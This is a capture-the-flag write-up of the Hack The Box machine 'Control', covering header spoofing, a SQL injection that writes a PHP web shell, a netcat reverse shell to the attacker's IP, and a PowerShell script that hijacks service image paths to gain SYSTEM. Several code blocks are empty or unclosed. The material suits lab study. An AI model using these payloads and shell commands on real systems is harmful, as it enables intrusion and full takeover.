## Summary

Control just retired today. I had lots of fun solving it, especially writing a PowerShell service bruteforce script. Its IP address is 10.10.10.167 and I added it to /etc/hosts as control.htb. Without further ado, let's jump right in!

## Scanning & Accessing Admin's Page

A basic nmap scan was enough to get me started:

{% highlight bash %}

root@fury-battlestation:~/htb/blog/control# nmap -sV control.htb -oN scan.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-24 12:57 EDT
Nmap scan report for control.htb (10.10.10.167)

root@fury-battlestation:~/htb/blog/control#

{% endhighlight %}

There were only 3 open ports, and port 80 looked more interesting than the others. When I opened it in a browser, the following page loaded:
<center><img src="/images/control_htb_writeup/image-0.png"></center>

Because the site looked custom-made and I accumulated some experience with HTB (see badge at the bottom of the page), I instantly clicked the 'admin' button and got the following error page:
<center><img src="/images/control_htb_writeup/image-1.png"></center>

The page was talking about a proxy. I assumed that the PHP script checked some headers to verify whether the user is using the proxy or not. However, I did not know the proxy's IP address, so I continued enumerating. I found the following comment in the main page's source code:

<center><img src="/images/control_htb_writeup/image-2.png"></center>

The proxy was probably located at 192.168.4.28. To get acces to the admin panel, I opened Burp, intercepted the request and added an 'X-Forwarded-For' header. After the insertion, the request looked like this:
<center><img src="/images/control_htb_writeup/image-3.png"></center>

After forwarding the request, the admin panel loaded:
<center><img src="/images/control_htb_writeup/image-4.png"></center>

## Manually Exploiing the SQL Injection

There was a list of products which could be viewed, modified and deleted. I assumed the script used an SQL database to store this information and I began testing for injection points. By searching for ', I got an error:
<center><img src="/images/control_htb_writeup/image-5.png"></center>

Knowing that the backend DB is MariaDB, I captured the request in Burp and tried sending a valid UNION statement. After a few tries, I got the following payload:

{% highlight bash %}
productName=a' UNION ALL SELECT 1,2,3,4,5,6 #
{% endhighlight %}

According to the nmap scan, the server was running Widnows. I used this information to create a PHP shell:

{% highlight bash %}
productName=a' UNION ALL SELECT 1,'<?php echo shell_exec($_GET["yaku"]); ?>',3,4,5,6 INTO OUTFILE  'C:\\Inetpub\\wwwroot\\yakuhito.php' #
{% endhighlight %}

I then tried to run 'whoami' on the target machine to confirm that the injection worked:
<center><img src="/images/control_htb_writeup/image-6.png"></center>

Getting a shell this way is usually ok, however, due to the nature of this box, I prefered to use SQLMap to upload a better shell.

## Using SQLMap for File Upload

One of the beft features of SQLMap is the ability to parse an HTTP request and test all parameters. You don't need to specify a host or anything related; SQLMap will figure that out. In my case, the request file (named req.txt) contained the following text:

{% highlight bash %}
POST /search_products.php HTTP/1.1
Host: control.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://control.htb/admin.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.4.28
Cache-Control: max-age=0

productName=a
{% endhighlight %}

Identifying the injection with SQLMap was pretty straightforward:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/control# sqlmap -r req.txt --level 5 --risk 3 --batch

As I said before, I wanted a more advanced webshell. I usually use [this one](https://github.com/WhiteWinterWolf/wwwolf-php-webshell). I downloaded it to my computer and saved it as 'yakuplusplus.php'. After that, uploading it to the remote machine took only one command:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/control# sqlmap -r req.txt --file-write="yakuplusplus.php" --file-dest="C:\\Inetpub\\wwwroot\\yakuplusplus.php" --batch

The new shell was located at /yakuplusplus.php:
<center><img src="/images/control_htb_writeup/image-7.png"></center>

A small problem appeared: I couldn't upload any files to the wwwroot directory because I didn't have the required permissions. Luckily for me, the wwwroot/uploads directory was writeable.
Now that I had an easier way of uploading files and executting commands, I uploaded a netcat binary and created a reverse shell using the following command:
{% highlight bash %}
nc.exe 10.10.14.187 443 -e powershell.exe
{% endhighlight %}

After executing the command, a reverse shell connected on port 443:
{% highlight powershell %}

## Getting Hector's Password

Since the current user had no home directory (meaning no user.txt file), I enumerated the machine's users:
{% highlight powershell %}
PS C:\inetpub\wwwroot\uploads> dir C:\Users
dir C:\Users


    Directory: C:\Users


Mode                LastWriteTime         Length Name

PS C:\inetpub\wwwroot\uploads>
{% endhighlight %}

I didn't have Hector's password yet, so I started enumerated the config files of the web app and found some credentials:

{% highlight powershell %}
PS C:\inetpub\wwwroot> type database.php
type database.php
<?php
class Database
{
    private static $dbName = 'warehouse' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'manager';
    private static $dbUserPassword = 'l3tm3!n';
[...]
{% endhighlight %}

Using that password for Hector didn't work, but it made me realise there could be more accounts for the database. I used SQLMap to test out my theory:
{% highlight bash %}

There was a user named hector, so I tried to crack his hash using john:

The password for hector could be 'l33th4x0rhector'. However, I did not have a way of verifying this credentials (yet).

## Becoming Hector

After some more enumeration, I saw that port 5985 was open:
{% highlight powershell %}
PS C:\inetpub\wwwroot> netstat -ano
netstat -ano

{% endhighlight %}

However, nmap didn't report it as open. This made me conclude that the port was only opened on localhost. I knew evil-winrm could authenticate as Hector if it could access that port, so I used plink.exe to make it accesible from my machine: 
{% highlight powershell %}
PS C:\inetpub\wwwroot\uploads> ./plink.exe -R 5985:127.0.0.1:5985 10.10.14.187
./plink.exe -R 5985:127.0.0.1:5985 10.10.14.187

I forgot to mention that I uploaded plink.exe using the web shell. The binary can be found on all Kali distributions (run 'locate plink.exe' to find it).
After forwarding port 5985, any traffic directed to my machine's port 5985 would be tunneled to Fidelity's port 5985. This meant that I could finally authenticate as Hector:

The user proof starts with 'd8' 😉

## Bruteforcing my Way to Root

The first interesting thing that I uncovered during enumeration as Hector was his PS history:

{% highlight powershell %}
*Evil-WinRM* PS C:\Users\Hector\Documents> type C:\Users\Hector\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
*Evil-WinRM* PS C:\Users\Hector\Documents>
{% endhighlight %}

Since the name of the box is Control and Hector looked at the CurrentControlSet registry, I knew that privesc had something to do with it. My theory was that some services might have insecure permissions (e.g. Hector could modify them - this is bad because services are usually started by SYSTEM). To test my theory, I used Microsoft's accesschk.exe tool:
{% highlight powershell %}
*Evil-WinRM* PS C:\Users\Hector\Documents> upload ./accesschk.exe
Info: Uploading ./accesschk.exe to C:\Users\Hector\Documents\accesschk.exe

*Evil-WinRM* PS C:\Users\Hector\Documents> ./accesschk.exe "Hector" -kvuqsv hklm:\System\CurrentControlSet\Services
[...]
RW HKLM\System\CurrentControlSet\Services\ws2ifsl
	KEY_ALL_ACCESS
RW HKLM\System\CurrentControlSet\Services\ws2ifsl\Parameters
	KEY_ALL_ACCESS
RW HKLM\System\CurrentControlSet\Services\WSearch

[...]
{% endhighlight %}

There were lots of services which Hector had access to edit. However, I couldn't exploit all of them: in order to succesfully become SYSTEM, I needed to change the service's binary path to a reverse shell (granted by KEY_ALL_ACCESS) and also be able to restart the services (not included in the KEY_ALL_ACCESS permission). Since I couldn't find a way to see which services I can restart, I just used the scrit below to try and exploit each service:
{% highlight powershell %}
# I still suck at powershell
# Command to be executed on successful exploitation
$cmd = "C:\inetpub\wwwroot\uploads\nc.exe 10.10.14.187 444 -e powershell.exe"

# Create a list of services
$otp = ./accesschk.exe "Hector" -kvuqsv hklm:\System\CurrentControlSet\Services
$services = $otp.Split([Environment]::NewLine)

# Lopp through each service
foreach($service in $services) {
	# If the current line is not a service, skip it
	if(!$service.StartsWith("RW HKLM")) {
		continue
	}
	# Validate that the line is indeed a service
	$name = $service.Split("\\")[-1].Split([Environment]::NewLine)[0]
	$s = Get-Service -Name $name -ErrorAction SilentlyContinue
	if(!$s) {
		continue
	}
	echo $service
	$serv = $service.Split(" ")[-1].Split([Environment]::NewLine)[0]
	echo $serv
	# Attempt to exploit the service:
	# 1. Change the service's binary path to $cmd
	# 2. Restart the service
	if($s.Status -eq 'Running') {
		reg add $serv /v ImagePath /t REG_EXPAND_SZ /d "$cmd" /f >a.txt
		if((Get-Service -Name $name).Status -eq 'Running') {
			Get-Service -Name $name | Stop-Service -ErrorAction SilentlyContinue
			Write-Host "[STOP] "$name
		}
	} elseif ($s.Status -eq 'Stopped') {
		reg add $serv /v ImagePath /t REG_EXPAND_SZ /d "$cmd" /f >a.txt
		if((Get-Service -Name $name).Status -eq 'Stopped') {
			Get-Service -Name $name | Start-Service -ErrorAction SilentlyContinue
			Write-Host "[START] "$name
		}
	}
}
{% endhighlight %}

After uploading and executing the script, a reverse shell connected on port 444 with NT UTHORITY/SYSTEM privileges. The restartable service seemed to be 'NetSetupSvc', though I'm not sure if it's the only one:
{% highlight powershell %}
PS C:\Windows\system32> whoami; hostname; type c:\users\administrator\desktop\root.txt
whoami; hostname; type c:\users\administrator\desktop\root.txt
nt authority\system
Fidelity
[redacted]
PS C:\Windows\system32>
{% endhighlight %}

The first two characters of the root proof are '8f' 😉
